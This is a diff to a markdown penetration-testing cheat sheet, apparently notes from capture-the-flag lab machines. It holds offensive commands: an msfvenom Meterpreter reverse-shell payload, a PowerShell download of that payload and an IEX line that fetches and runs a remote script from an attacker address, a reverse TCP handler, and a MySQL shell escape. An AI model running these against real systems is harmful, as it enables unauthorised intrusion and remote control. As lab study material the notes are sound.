@@ -147,7 +147,7 @@ tags:
   ```
   * If we were able to access FTP and still no root access, we can do like this ...
   ```
-  # ftp 10.10.10.37
+  ftp 10.10.10.37
   Connected to 10.10.10.37.
   220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.10.37]
   Name (10.10.10.37:root): enemy
@@ -167,10 +167,10 @@ tags:
   [*] Started reverse TCP handler on <HOST_IP>:3333 
   msf5 exploit(multi/handler) > 
   ```
-  * To get Better Shell on windows : Once a basic command shell has been obtained, it can be elevated to a Meterpreter shell by
-  generating an executable payload with the command `msfvenom -p windows/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f exe > writeup.exe` and then downloaded on the target with the command `powershell "(new-object   System.Net.WebClient).Downloadfile('http://<IP>/writeup.exe', 'writeup.exe')"`   Once a full Meterpreter shell has been obtained, it is a good idea to migrate to a process with the correct architecture. In this case jrunsvc.exe will work. Running local_exploit_suggester in 64-bit mode reveals only one suggestion; `exploit/windows/local/ms10_092_schelevator` . Running the module immediately grants an
-  elevated Meterpreter session.
-  
+  * To get Better Shell on windows:
+  ```
+  Once a basic command shell has been obtained, it can be elevated to a Meterpreter shell    bygenerating an executable  payload with the command `msfvenom -p windows/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f exe > writeup.exe` and then downloaded on the target with the command `powershell "(new-object   System.Net.WebClient).Downloadfile('http://<IP>/writeup.exe', 'writeup.exe')"`   Once a full Meterpreter shell has been obtained, it is a good idea to migrate to a process with the correct architecture. In this case jrunsvc.exe will work. Running local_exploit_suggester in 64-bit mode reveals only one suggestion; `exploit/windows/local/ms10_092_schelevator` . Running the module immediately grants an elevated Meterpreter session.
+  ```
   * Windows Enumeration Script:
   ```
   PS C:\Users\L4mpje\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7:8000/jaws-enum.ps1')       
@@ -178,8 +178,6 @@ tags:
   Running J.A.W.S. Enumeration                                                                                           
                 
   ```
-  
-  The root flag can be obtained from:
   * Get Shell from MYSQL
   ```
   mysql> \! /bin/sh
